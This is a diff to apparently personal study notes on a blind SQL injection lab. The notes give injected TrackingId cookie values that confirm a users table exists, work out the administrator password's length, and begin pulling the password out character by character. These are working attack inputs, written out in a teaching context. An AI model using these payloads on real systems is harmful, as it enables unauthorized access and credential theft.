@@ -116,11 +116,19 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
 …xyz' AND '1'='1
 …xyz' AND '1'='2
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+Verify that the condition is true, confirming that there is a table called users.
 this for user name.
 TrackingId=F1047r7QgL3blDNA' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 to know leng of the password use this 
 TrackingId=F1047r7QgL3blDNA' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+This condition should be true, confirming that the password is greater than 1 character in length.
+Send a series of follow-up values to test different password lengths. Send:
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+Then send:
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the Welcome back message disappears), you have determined the length of the password, which is in fact 20 characters long.
 For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
 To do this, start with the following input:
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
